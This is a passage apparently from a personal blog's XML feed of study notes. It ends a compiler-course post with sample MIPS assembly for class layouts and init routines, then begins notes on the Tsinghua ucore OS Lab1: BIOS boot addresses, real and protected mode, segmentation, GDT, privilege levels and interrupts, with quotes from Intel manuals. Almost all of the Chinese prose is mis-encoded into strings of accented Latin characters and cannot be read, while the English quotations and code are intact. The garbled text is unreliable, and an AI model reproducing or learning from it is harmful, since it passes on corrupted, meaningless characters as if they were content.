Main.main<br></code></pre></div></td></tr></table></figure></li><li><p>å°†æ¯ä¸ªç±»çš„ç±»å‹ä¿¡æ¯è¾“å‡ºã€‚<code>protObj</code>ä¸­å«æœ‰å½“å‰ç±»çš„å±æ€§ä»¥åŠå‡½æ•°è¡¨ã€‚ä¾‹å¦‚ä»¥ä¸‹éƒ¨åˆ†æ±‡ç¼–ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">  .word  -1         # -1 header for the garbage collector(eye catcher for _gc_check)<br>Main_protObj:         # label<br>  .word  2            # class tag<br>  .word  7            # total_attributes + DEFAULT_OBJFIELDS<br>  .word  Main_dispTab # å‡½æ•°è¡¨<br>  .word  int_const0   # ç¬¬ä¸€ä¸ªattributeæ˜¯æ•°å­—ç±»å‹<br>  .word  str_const12  # ç¬¬äºŒä¸ªattributeæ˜¯å­—ç¬¦ä¸²ç±»å‹<br>  .word  bool_const0  # ç¬¬ä¸‰ä¸ªattributeæ˜¯å¸ƒå°”ç±»å‹<br>  .word  0            # ç¬¬å››ä¸ªattributeæ˜¯å…¶ä»–ç±»å‹ï¼Œä¾‹å¦‚å„ç§ç±»<br></code></pre></div></td></tr></table></figure></li><li><p>å£°æ˜å…¨å±€ä»£ç æ®µçš„ç›¸å…³ä¿¡æ¯ï¼Œä¾‹å¦‚ä»¥ä¸‹æ±‡ç¼–ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">#å£°æ˜å †çš„ç›¸å…³ä¿¡æ¯<br>  .globl  heap_start<br>heap_start:<br>  .word  0<br>#å£°æ˜textä»£ç æ®µ<br>  .text<br>  .globl  Main_init<br>  .globl  Int_init<br>  .globl  String_init<br>  .globl  Bool_init<br>  .globl  Main.main<br></code></pre></div></td></tr></table></figure></li><li><p>è¾“å‡ºæ¯ä¸ªç±»çš„åˆå§‹åŒ–å‡½æ•°çš„ä»£ç ï¼Œä¾‹å¦‚ä»¥ä¸‹æ±‡ç¼–ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">String_init:<br>  addiu  $sp $sp -12<br>  sw  $fp 12($sp)<br>  sw  $s0 8($sp)<br>  sw  $ra 4($sp)<br>  addiu  $fp $sp 4<br>  move  $s0 $a0<br>  jal  Object_init<br>  move  $a0 $s0<br>  lw  $fp 12($sp)<br>  lw  $s0 8($sp)<br>  lw  $ra 4($sp)<br>  addiu  $sp $sp 12<br>  jr  $ra<br></code></pre></div></td></tr></table></figure><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>å› ä¸ºæ­¤æ—¶å·²ç»é€šè¿‡äº†semant, å¯ä»¥ç¡®å®šASTæ˜¯æ­£ç¡®çš„ä»è€Œ<strong>æ— éœ€æ£€æŸ¥</strong><a href="#fnref:1" rev="footnote" class="footnote-backref"> â†©</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>Stanford-cs143-pdfä¸­æåˆ°çš„<a href="#fnref:2" rev="footnote" class="footnote-backref"> â†©</a></span></span></li></ol></div></section></li></ul>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>complier</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tsinghuaæ“ä½œç³»ç»Ÿè¯¾ç¨‹</title>
    <link href="/2021-10/Archive-ucore/"/>
    <url>/2021-10/Archive-ucore/</url>
    
    <content type="html"><![CDATA[<h1 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h1><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><h3 id="1-BIOSå¯åŠ¨é¡ºåº"><a href="#1-BIOSå¯åŠ¨é¡ºåº" class="headerlink" title="1.BIOSå¯åŠ¨é¡ºåº"></a>1.BIOSå¯åŠ¨é¡ºåº</h3><ul><li>CPUåŠ ç”µåä»£ç æ®µå¯„å­˜å™¨åˆå§‹åŒ–ä¸º<strong>CS = F000H, EIP = 0000FFF0H</strong>, ç„¶åå†è®¡ç®— Base+IP = FFFF0000H + 0000FFF0H = FFFFFFF0H å¾—åˆ°BIOSçš„<a href="https://en.wikipedia.org/wiki/EPROM">EPROM</a>(Erasable Programmable Read Only Memory)æ‰€åœ¨åœ°, è¿™ä¸ªåœ°å€çš„ç¬¬ä¸€æ¡æŒ‡ä»¤æ˜¯ä¸€ä¸ª<strong>é•¿è·³è½¬æŒ‡ä»¤</strong>(è¿™æ ·CSå’ŒEIPéƒ½ä¼šæ›´æ–°)åˆ°BIOSä»£ç ä¸­æ‰§è¡Œ</li><li>BIOSåšå®Œè®¡ç®—æœºç¡¬ä»¶è‡ªæ£€å’Œåˆå§‹åŒ–åï¼Œä¼šé€‰æ‹©ä¸€ä¸ªå¯åŠ¨è®¾å¤‡ï¼ˆä¾‹å¦‚è½¯ç›˜ã€ç¡¬ç›˜ã€å…‰ç›˜ç­‰ï¼‰ï¼Œå¹¶ä¸”è¯»å–è¯¥è®¾å¤‡çš„ç¬¬ä¸€æ‰‡åŒº(å³ä¸»å¼•å¯¼æ‰‡åŒºæˆ–å¯åŠ¨æ‰‡åŒº)åˆ°å†…å­˜ä¸€ä¸ªç‰¹å®šçš„åœ°å€0x7c00å¤„ï¼Œç„¶åCPUæ§åˆ¶æƒä¼šè½¬ç§»åˆ°é‚£ä¸ªåœ°å€ç»§ç»­æ‰§è¡Œã€‚è‡³æ­¤BIOSçš„åˆå§‹åŒ–å·¥ä½œåšå®Œäº†ï¼Œè¿›ä¸€æ­¥çš„å·¥ä½œäº¤ç»™äº†ucoreçš„<strong>bootloader</strong>ã€‚</li></ul><p><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_3_1_bios_booting.html#%E8%A1%A5%E5%85%85%E4%BF%A1%E6%81%AF">é™„</a>:</p><ul><li>åœ¨16ä½çš„8086 CPUæ—¶ä»£ï¼Œå†…å­˜é™åˆ¶åœ¨1MBèŒƒå›´å†…ï¼Œä¸”BIOSçš„ä»£ç å›ºåŒ–åœ¨EPROMä¸­ã€‚åœ¨åŸºäºIntelçš„8086 CPUçš„PCæœºä¸­çš„EPROMè¢«ç¼–å€åœ¨1ï¼­Bå†…å­˜åœ°å€ç©ºé—´çš„æœ€é«˜64KBä¸­ã€‚PCåŠ ç”µåï¼ŒCSå¯„å­˜å™¨åˆå§‹åŒ–ä¸º<strong>0xF000</strong>ï¼ŒIPå¯„å­˜å™¨åˆå§‹åŒ–ä¸º<strong>0xFFF0</strong>, CS:IP=0xF000:0XFFF0ï¼ˆSegment:Offset è¡¨ç¤ºï¼‰=<strong>0xFFFF0</strong>(Linearè¡¨ç¤º)</li><li>é»˜è®¤å°†æ‰§è¡ŒBIOS ROMç¼–å€åœ¨32ä½å†…å­˜åœ°å€ç©ºé—´çš„æœ€é«˜ç«¯ï¼Œå³ä½äº4GBåœ°å€çš„æœ€åä¸€ä¸ª64KBå†…ã€‚åœ¨PCç³»ç»Ÿå¼€æœºå¤ä½æ—¶ï¼ŒCPUè¿›å…¥å®æ¨¡å¼ï¼Œå¹¶å°†CSå¯„å­˜å™¨è®¾ç½®æˆ0xF000ï¼Œå°†å®ƒçš„<strong>shadow register</strong>çš„<strong>Base</strong>å€¼åˆå§‹åŒ–è®¾ç½®ä¸º0xFFFF0000ï¼ŒEIPå¯„å­˜å™¨åˆå§‹åŒ–è®¾ç½®ä¸º0x0000FFF0ã€‚æ‰€ä»¥æœºå™¨æ‰§è¡Œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤çš„ç‰©ç†åœ°å€æ˜¯<strong>0xFFFFFFF0</strong>ã€‚80386çš„BIOSä»£ç ä¹Ÿè¦å’Œä»¥å‰8086çš„BIOSä»£ç å…¼å®¹ï¼Œæ•…åœ°å€0xFFFFFFF0å¤„çš„æŒ‡ä»¤è¿˜æ˜¯ä¸€æ¡é•¿è·³è½¬æŒ‡ä»¤<code>jmp F000:E05B</code>ã€‚æ³¨æ„ï¼Œè¿™ä¸ªé•¿è·³è½¬æŒ‡ä»¤ä¼šè§¦å‘æ›´æ–°CSå¯„å­˜å™¨å’Œå®ƒçš„shadow registerï¼Œå³æ‰§è¡Œ<code>jmp F000 : E05B</code>åï¼ŒCSå°†è¢«æ›´æ–°æˆ0xF000ã€‚è¡¨é¢ä¸Šçœ‹CSå…¶å®æ²¡æœ‰å˜åŒ–ï¼Œä½†CSçš„shadow registerè¢«æ›´æ–°ä¸ºå¦å¤–ä¸€ä¸ªå€¼äº†ï¼Œå®ƒçš„BaseåŸŸè¢«æ›´æ–°æˆ0x000F0000ï¼Œæ­¤æ—¶å½¢æˆçš„ç‰©ç†åœ°å€ä¸ºBase+EIP=0x000FE05Bï¼Œè¿™å°±æ˜¯CPUæ‰§è¡Œçš„ç¬¬äºŒæ¡æŒ‡ä»¤çš„åœ°å€ã€‚æ­¤æ—¶è¿™æ¡æŒ‡ä»¤çš„åœ°å€å·²ç»æ˜¯1M<strong>ä»¥å†…</strong>äº†ï¼Œä¸”æ­¤åœ°å€ä¸å†ä½äºBIOS ROMä¸­ï¼Œè€Œæ˜¯ä½äºRAMç©ºé—´ä¸­ã€‚ç”±äºIntelè®¾è®¡äº†ä¸€ç§æ˜ å°„æœºåˆ¶ï¼Œå°†å†…å­˜é«˜ç«¯çš„BIOS ROMæ˜ å°„åˆ°1MBä»¥å†…çš„RAMç©ºé—´é‡Œï¼Œå¹¶ä¸”å¯ä»¥ä½¿è¿™ä¸€æ®µè¢«æ˜ å°„çš„RAMç©ºé—´å…·æœ‰ä¸ROMç±»ä¼¼çš„åªè¯»å±æ€§ã€‚æ‰€ä»¥PCæœºå¯åŠ¨æ—¶å°†å¼€å¯è¿™ç§æ˜ å°„æœºåˆ¶ï¼Œè®©4GBåœ°å€ç©ºé—´çš„æœ€é«˜ä¸€ä¸ª64KBçš„å†…å®¹ç­‰åŒäº1MBåœ°å€ç©ºé—´çš„æœ€é«˜ä¸€ä¸ª64Kçš„å†…å®¹ï¼Œä»è€Œä½¿å¾—æ‰§è¡Œäº†é•¿è·³è½¬æŒ‡ä»¤åï¼Œå…¶å®æ˜¯å›åˆ°äº†æ—©æœŸçš„8086 CPUåˆå§‹åŒ–æ§åˆ¶æµï¼Œä¿è¯äº†å‘ä¸‹å…¼å®¹</li></ul><p>ä¾‹å›¾:</p><img src="https://i.loli.net/2021/11/15/gqzhf1o9HjFSRZd.png" alt="image-20211110102048633"  /><img src="https://i.loli.net/2021/11/15/5smFgYn7Bxhq3Ke.png" alt="image-20211110101314467" style="zoom:67%;" /><h3 id="2-å®æ¨¡å¼"><a href="#2-å®æ¨¡å¼" class="headerlink" title="2.å®æ¨¡å¼"></a>2.å®æ¨¡å¼</h3><p>å‚è€ƒèµ„æ–™:ã€ŠIntel 80386 Reference Programmers Manual-i386ã€‹, åŸºæœ¬æ˜¯è¿™ä¸ªçš„ç¿»è¯‘</p><p>åœ¨<strong>bootloader</strong>æ¥æ‰‹BIOSçš„å·¥ä½œåï¼Œå½“å‰çš„PCç³»ç»Ÿå¤„äºå®æ¨¡å¼ï¼ˆ16ä½æ¨¡å¼ï¼‰è¿è¡ŒçŠ¶æ€ï¼Œåœ¨è¿™ç§çŠ¶æ€ä¸‹è½¯ä»¶å¯è®¿é—®çš„ç‰©ç†å†…å­˜ç©ºé—´ä¸èƒ½è¶…è¿‡1MBï¼Œä¸”æ— æ³•å‘æŒ¥Intel 80386ä»¥ä¸Šçº§åˆ«çš„32ä½CPUçš„4GBå†…å­˜ç®¡ç†èƒ½åŠ›ã€‚</p><p>å®æ¨¡å¼å°†æ•´ä¸ªç‰©ç†å†…å­˜çœ‹æˆåˆ†æ®µçš„åŒºåŸŸï¼Œç¨‹åºä»£ç å’Œæ•°æ®ä½äºä¸åŒåŒºåŸŸï¼Œæ“ä½œç³»ç»Ÿå’Œç”¨æˆ·ç¨‹åºå¹¶æ²¡æœ‰åŒºåˆ«å¯¹å¾…ï¼Œ<strong>è€Œä¸”æ¯ä¸€ä¸ªæŒ‡é’ˆéƒ½æ˜¯æŒ‡å‘å®é™…çš„ç‰©ç†åœ°å€</strong>ã€‚è¿™æ ·ï¼Œç”¨æˆ·ç¨‹åºçš„ä¸€ä¸ªæŒ‡é’ˆå¦‚æœæŒ‡å‘äº†æ“ä½œç³»ç»ŸåŒºåŸŸæˆ–å…¶ä»–ç”¨æˆ·ç¨‹åºåŒºåŸŸï¼Œå¹¶ä¿®æ”¹äº†å†…å®¹ï¼Œé‚£ä¹ˆå…¶åæœå°±å¾ˆå¯èƒ½æ˜¯ç¾éš¾æ€§çš„ã€‚é€šè¿‡ä¿®æ”¹A20åœ°å€çº¿å¯ä»¥å®Œæˆä»å®æ¨¡å¼åˆ°ä¿æŠ¤æ¨¡å¼çš„è½¬æ¢ã€‚æœ‰å…³A20çš„è¿›ä¸€æ­¥ä¿¡æ¯å¯å‚è€ƒâ€œ<a href="http://hengch.blog.163.com/blog/static/107800672009013104623747/">å…³äºA20 Gate</a>â€ã€‚z</p><img src="https://i.loli.net/2021/11/15/v6fC2e43WESLcaU.png" alt="img" style="zoom: 67%;" /><ul><li><strong>åœ°å€<code>0-0x9ffff</code>çš„640KBå†…å­˜æ˜¯DRAMï¼Œå³æ’åœ¨ä¸»æ¿ä¸Šçš„å†…å­˜æ¡ã€‚</strong><br>é¡¶éƒ¨<code>0xf0000-0xfffff</code>çš„64KBå†…å­˜æ˜¯ROMï¼Œå­˜æ”¾BIOSä»£ç ã€‚</li><li>EPROMæ˜¯é€šè¿‡åœ°å€æ¥è®¿é—®çš„, 80386å°†å…¶æ˜ å°„åˆ°å†…å­˜çš„é¡¶ç«¯, å…¶ä»–çš„ä¸€äº›å¤–è®¾ä¹ŸåŒæ ·é€šè¿‡æ˜ å°„åˆ°åœ°å€ç©ºé—´æ¥è®¿é—®å®ƒä»¬</li></ul><h3 id="3-åˆ†æ®µæœºåˆ¶-ä¿æŠ¤æ¨¡å¼"><a href="#3-åˆ†æ®µæœºåˆ¶-ä¿æŠ¤æ¨¡å¼" class="headerlink" title="3.åˆ†æ®µæœºåˆ¶/ä¿æŠ¤æ¨¡å¼"></a>3.åˆ†æ®µæœºåˆ¶/ä¿æŠ¤æ¨¡å¼</h3><h4 id="a-ä¿æŠ¤æ¨¡å¼"><a href="#a-ä¿æŠ¤æ¨¡å¼" class="headerlink" title="a.ä¿æŠ¤æ¨¡å¼"></a>a.ä¿æŠ¤æ¨¡å¼</h4><ul><li><p>åªæœ‰åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œ80386çš„<strong>å…¨éƒ¨32æ ¹åœ°å€çº¿æœ‰æ•ˆ</strong>ï¼Œå¯å¯»å€é«˜è¾¾4Gå­—èŠ‚çš„çº¿æ€§åœ°å€ç©ºé—´å’Œç‰©ç†åœ°å€ç©ºé—´ï¼Œå¯è®¿é—®64TBï¼ˆæœ‰2^14^ä¸ªæ®µï¼Œæ¯ä¸ªæ®µæœ€å¤§ç©ºé—´ä¸º2^32^å­—èŠ‚ï¼‰çš„é€»è¾‘åœ°å€ç©ºé—´ï¼Œå¯é‡‡ç”¨åˆ†æ®µå­˜å‚¨ç®¡ç†æœºåˆ¶å’Œåˆ†é¡µå­˜å‚¨ç®¡ç†æœºåˆ¶ã€‚è¿™ä¸ä»…ä¸ºå­˜å‚¨å…±äº«å’Œä¿æŠ¤æä¾›äº†ç¡¬ä»¶æ”¯æŒï¼Œè€Œä¸”ä¸ºå®ç°è™šæ‹Ÿå­˜å‚¨æä¾›äº†ç¡¬ä»¶æ”¯æŒã€‚é€šè¿‡æä¾›4ä¸ªç‰¹æƒçº§å’Œå®Œå–„çš„ç‰¹æƒæ£€æŸ¥æœºåˆ¶ï¼Œæ—¢èƒ½å®ç°èµ„æºå…±äº«åˆèƒ½ä¿è¯ä»£ç æ•°æ®çš„å®‰å…¨åŠä»»åŠ¡çš„éš”ç¦»ã€‚</p><blockquote><p>ã€è¡¥å……ã€‘ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæœ‰ä¸¤ä¸ªæ®µè¡¨ï¼šGDTï¼ˆGlobal Descriptor Tableï¼‰å’ŒLDTï¼ˆLocal Descriptor Tableï¼‰ï¼Œæ¯ä¸€å¼ æ®µè¡¨å¯ä»¥åŒ…å«8192 (2^13)ä¸ªæè¿°ç¬¦[1]ï¼Œå› è€Œæœ€å¤šå¯ä»¥åŒæ—¶å­˜åœ¨2 * 2^13 = 2^14^ä¸ªæ®µã€‚è™½ç„¶ä¿æŠ¤æ¨¡å¼ä¸‹å¯ä»¥æœ‰è¿™ä¹ˆå¤šæ®µï¼Œé€»è¾‘åœ°å€ç©ºé—´çœ‹èµ·æ¥å¾ˆå¤§ï¼Œä½†å®é™…ä¸Šæ®µå¹¶ä¸èƒ½æ‰©å±•ç‰©ç†åœ°å€ç©ºé—´ï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå„ä¸ªæ®µçš„åœ°å€ç©ºé—´æ˜¯<strong>ç›¸äº’é‡å </strong>çš„ã€‚ç›®å‰æ‰€è°“çš„64TBï¼ˆ2^(14+32)^=2^46^ï¼‰é€»è¾‘åœ°å€ç©ºé—´æ˜¯ä¸€ä¸ªç†è®ºå€¼ï¼Œæ²¡æœ‰å®é™…æ„ä¹‰ã€‚åœ¨32ä½ä¿æŠ¤æ¨¡å¼ä¸‹ï¼ŒçœŸæ­£çš„ç‰©ç†ç©ºé—´ä»ç„¶åªæœ‰2^32å­—èŠ‚é‚£ä¹ˆå¤§ã€‚æ³¨ï¼šåœ¨ucore labä¸­åªç”¨åˆ°äº†GDTï¼Œæ²¡æœ‰ç”¨LDTã€‚</p><p>Reference: [1] 3.5.1 Segment Descriptor Tables, IntelÂ® 64 and IA-32 Architectures Software Developerâ€™s Manual</p></blockquote></li></ul><h4 id="b-åˆ†æ®µæœºåˆ¶"><a href="#b-åˆ†æ®µæœºåˆ¶" class="headerlink" title="b.åˆ†æ®µæœºåˆ¶"></a>b.åˆ†æ®µæœºåˆ¶</h4><blockquote><p>b,c,dé¡ºåºæŒ‰ç…§<strong>35</strong>å¹´å‰çš„i386æ–‡æ¡£, å›¾ç‰‡æ¥è‡ªIA-32æ–‡æ¡£</p></blockquote><ul><li><p>å°†å†…å­˜åˆ’åˆ†æˆä»¥èµ·å§‹åœ°å€å’Œé•¿åº¦é™åˆ¶è¿™ä¸¤ä¸ªäºŒç»´å‚æ•°è¡¨ç¤ºçš„å†…å­˜å—ï¼Œè¿™äº›å†…å­˜å—å°±ç§°ä¹‹ä¸ºæ®µï¼ˆSegmentï¼‰ã€‚ç¼–è¯‘å™¨æŠŠæºç¨‹åºç¼–è¯‘æˆæ‰§è¡Œç¨‹åºæ—¶ç”¨åˆ°çš„ä»£ç æ®µã€æ•°æ®æ®µã€å †å’Œæ ˆç­‰æ¦‚å¿µåœ¨è¿™é‡Œå¯ä»¥ä¸æ®µè”ç³»èµ·æ¥ï¼ŒäºŒè€…åœ¨å«ä¹‰ä¸Šæ˜¯ä¸€è‡´çš„</p></li><li><p>è½¬æ¢é€»è¾‘åœ°å€ï¼ˆLogical Address,åº”ç”¨ç¨‹åºå‘˜çœ‹åˆ°çš„åœ°å€ï¼‰åˆ°ç‰©ç†åœ°å€ï¼ˆPhysical Address, å®é™…çš„ç‰©ç†å†…å­˜åœ°å€ï¼‰åˆ†ä»¥ä¸‹ä¸¤æ­¥ï¼š</p><p>[1] åˆ†æ®µåœ°å€è½¬æ¢ï¼š<img src="https://i.loli.net/2021/11/15/2voBNa4eHCJYpDS.png" alt="image-20211110224722534" style="zoom:67%;" /></p><p>[2] åˆ†é¡µåœ°å€è½¬æ¢ï¼Œè¿™ä¸€æ­¥ä¸­æŠŠçº¿æ€§åœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€ã€‚ï¼ˆæ³¨æ„ï¼šè¿™ä¸€æ­¥æ˜¯å¯é€‰çš„ï¼Œç”±æ“ä½œç³»ç»Ÿå†³å®šæ˜¯å¦éœ€è¦ã€‚åœ¨åç»­è¯•éªŒä¸­ä¼šæ¶‰åŠã€‚</p></li></ul><h4 id="c-Segment-Selector"><a href="#c-Segment-Selector" class="headerlink" title="c.Segment Selector"></a>c.Segment Selector</h4><ul><li>A segment selector is a 16-bit identifier for a segment (see Figure 3-6). It does not point directly to the segment,<br>but instead points to the segment descriptor that defines the segment. </li></ul><img src="https://i.loli.net/2021/11/15/2pZPMgihVI6QSrR.png" alt="image-20211110233814790" style="zoom:67%;" /><h4 id="d-Segment-register"><a href="#d-Segment-register" class="headerlink" title="d.Segment register"></a>d.Segment register</h4><ul><li><p>For virtually any kind of program execution to take place, at least the code-segment (CS), data-segment (DS), and stack-segment (SS) registers must be loaded with valid segment selectors.</p></li><li><p>three additional data-segment registers (ES, FS, and GS) are optional</p><img src="https://i.loli.net/2021/11/15/JX7IuMO4QodfVFK.png" alt="image-20211110232108110" style="zoom: 67%;" /></li><li><p>For a program to access a segment, the segment selector for the segment <strong>must have been loaded in one of the</strong><br><strong>segment registers</strong>. So, although a system can define thousands of segments, <strong>only 6 can be available</strong> for immediate<br>use. </p></li><li><p><strong>shadow register(â€œhiddenâ€ part):</strong></p><p>When a segment selector is loaded into the visible part, the processor also loads the hidden part from the segment descriptor pointed to by the segment selector</p></li></ul><h4 id="e-Segment-Descriptor"><a href="#e-Segment-Descriptor" class="headerlink" title="e.Segment Descriptor"></a>e.Segment Descriptor</h4><blockquote><p><strong>æ¥è‡ªIA-32æ–‡æ¡£ P2902/3-10 Vol. 3A</strong> </p></blockquote><img src="..\..\image\ucore\IxTJPGOZWVjz2BD-16373800575412.png" alt="image-20211110230124631.png" style="zoom:80%;" /><h4 id="f-Global-Descriptor-Tables"><a href="#f-Global-Descriptor-Tables" class="headerlink" title="f.Global Descriptor Tables"></a>f.Global Descriptor Tables</h4><blockquote><p><strong>(IA-32 P2906/ 3-14 Vol. 3A)</strong>:</p></blockquote><p>å…¨å±€æè¿°ç¬¦è¡¨çš„æ˜¯ä¸€ä¸ªä¿å­˜å¤šä¸ªæ®µæè¿°ç¬¦çš„â€œæ•°ç»„â€ï¼Œå…¶èµ·å§‹åœ°å€ä¿å­˜åœ¨å…¨å±€æè¿°ç¬¦è¡¨å¯„å­˜å™¨GDTRä¸­ã€‚GDTRé•¿48ä½ï¼Œå…¶ä¸­é«˜32ä½ä¸ºåŸºåœ°å€ï¼Œä½16ä½ä¸ºæ®µç•Œé™ã€‚ç”±äºGDT ä¸èƒ½æœ‰GDTæœ¬èº«ä¹‹å†…çš„æè¿°ç¬¦è¿›è¡Œæè¿°å®šä¹‰ï¼Œæ‰€ä»¥å¤„ç†å™¨é‡‡ç”¨GDTRä¸ºGDTè¿™ä¸€ç‰¹æ®Šçš„ç³»ç»Ÿæ®µã€‚æ³¨æ„ï¼Œå…¨å±€æè¿°ç¬¦è¡¨ä¸­ç¬¬ä¸€ä¸ªæ®µæè¿°ç¬¦è®¾å®šä¸ºç©ºæ®µæè¿°ç¬¦ã€‚GDTRä¸­çš„æ®µç•Œé™ä»¥å­—èŠ‚ä¸ºå•ä½ã€‚å¯¹äºå«æœ‰Nä¸ªæè¿°ç¬¦çš„æè¿°ç¬¦è¡¨çš„æ®µç•Œé™é€šå¸¸å¯è®¾ä¸º8*N-1ã€‚</p><img src="https://i.loli.net/2021/11/15/t1iNrJbCeBzASFf.png" alt="image-20211110230336834" style="zoom:67%;" /><h4 id="g-Privilege-Level"><a href="#g-Privilege-Level" class="headerlink" title="g.Privilege Level"></a>g.Privilege Level</h4><ul><li>Current privilege level (<strong>CPL</strong>) â€” The CPL is the privilege level of the currently executing program or task. <u>It</u><br><u>is stored in bits 0 and 1 of the CS and SS segment registers.</u> Normally, the CPL is equal to the privilege level of<br>the code segment from which instructions are being fetched. The processor changes the CPL when program<br>control is transferred to a code segment with a different privilege level. </li></ul><blockquote><p>The CPL is treated slightly differently when accessing <strong>conforming code segments</strong>. Conforming code segments can be accessed from any privilege level that is equal to or numerically greater (less privileged) than the DPL of the conforming code segment. Also, the CPL is not changed when the processor accesses a conforming code segment that has a different privilege level than the CPL.</p></blockquote><ul><li>Descriptor privilege level (<strong>DPL</strong>) â€” The DPL is the privilege level of a segment or gate. It is stored in the DPL<br>field of the segment or gate descriptor for the segment or gate. </li><li>Requested privilege level (<strong>RPL</strong>) â€” The RPL is an override privilege level that is assigned to segment<br>selectors. It is stored in bits 0 and 1 of the segment selector. The RPL can be used to ensure that privileged code<br>does not access a segment on behalf of an application program unless the program itself has access privileges for<br>that segment. See Section 5.10.4, â€œChecking Caller Access Privileges (ARPL Instruction),â€ for a detailed description of<br>the purpose and typical use of the RPL.</li></ul><p><strong>PRIVILEGE CHECK:</strong> </p><p><img src="https://i.loli.net/2021/11/16/JGd27NnTwFDipOe.jpg" alt="img"></p><h3 id="4-ä¸­æ–­ä¸å¼‚å¸¸"><a href="#4-ä¸­æ–­ä¸å¼‚å¸¸" class="headerlink" title="4.ä¸­æ–­ä¸å¼‚å¸¸"></a>4.ä¸­æ–­ä¸å¼‚å¸¸</h3><ul><li>ä¸­æ–­æœºåˆ¶ç»™æ“ä½œç³»ç»Ÿæä¾›äº†å¤„ç†æ„å¤–æƒ…å†µçš„èƒ½åŠ›ï¼ŒåŒæ—¶å®ƒä¹Ÿæ˜¯å®ç°è¿›ç¨‹/çº¿ç¨‹æŠ¢å å¼è°ƒåº¦çš„ä¸€ä¸ªé‡è¦åŸºçŸ³ã€‚ä½†ä¸­æ–­çš„å¼•å…¥å¯¼è‡´äº†å¯¹æ“ä½œç³»ç»Ÿçš„ç†è§£æ›´åŠ å›°éš¾ã€‚</li><li>åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œæœ‰ä¸‰ç§ç‰¹æ®Šçš„ä¸­æ–­äº‹ä»¶ã€‚<ul><li>ç”±CPU<em>å¤–éƒ¨è®¾å¤‡å¼•èµ·çš„</em> å¤–éƒ¨äº‹ä»¶å¦‚I/Oä¸­æ–­ã€æ—¶é’Ÿä¸­æ–­ã€æ§åˆ¶å°ä¸­æ–­ç­‰æ˜¯å¼‚æ­¥äº§ç”Ÿçš„ï¼ˆå³äº§ç”Ÿçš„æ—¶åˆ»ä¸ç¡®å®šï¼‰ï¼Œä¸CPUçš„æ‰§è¡Œæ— å…³ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸º<strong>å¼‚æ­¥ä¸­æ–­</strong>(asynchronous interrupt)ä¹Ÿç§°å¤–éƒ¨ä¸­æ–­,ç®€ç§°<strong>ä¸­æ–­</strong>(interrupt)ã€‚</li><li>è€ŒæŠŠåœ¨CPUæ‰§è¡ŒæŒ‡ä»¤æœŸé—´æ£€æµ‹åˆ°<em>ä¸æ­£å¸¸çš„æˆ–éæ³•</em> çš„æ¡ä»¶(å¦‚é™¤é›¶é”™ã€åœ°å€è®¿é—®è¶Šç•Œ)æ‰€å¼•èµ·çš„å†…éƒ¨äº‹ä»¶ç§°ä½œ<strong>åŒæ­¥ä¸­æ–­</strong>(synchronous interrupt)ï¼Œä¹Ÿç§°å†…éƒ¨ä¸­æ–­ï¼Œç®€ç§°**å¼‚å¸¸(**exception)ã€‚</li><li>æŠŠåœ¨ç¨‹åºä¸­ä½¿ç”¨<em>è¯·æ±‚ç³»ç»ŸæœåŠ¡</em> çš„ç³»ç»Ÿè°ƒç”¨è€Œå¼•å‘çš„äº‹ä»¶ï¼Œç§°ä½œ<strong>é™·å…¥ä¸­æ–­</strong>(trap interrupt)ï¼Œä¹Ÿç§°<strong>è½¯ä¸­æ–­</strong>(soft interrupt)ï¼Œç³»ç»Ÿè°ƒç”¨(system call)ç®€ç§°<strong>trap</strong>ã€‚åœ¨åç»­è¯•éªŒä¸­ä¼šè¿›ä¸€æ­¥è®²è§£ç³»ç»Ÿè°ƒç”¨ã€‚</li></ul></li></ul><img src="https://i.loli.net/2021/11/16/5HxAC9w4XSiasbK.png"  style="zoom: 60%;" /><ul><li><p><strong>Interrupt Descriptor Table</strong>:åŒGDTä¸€æ 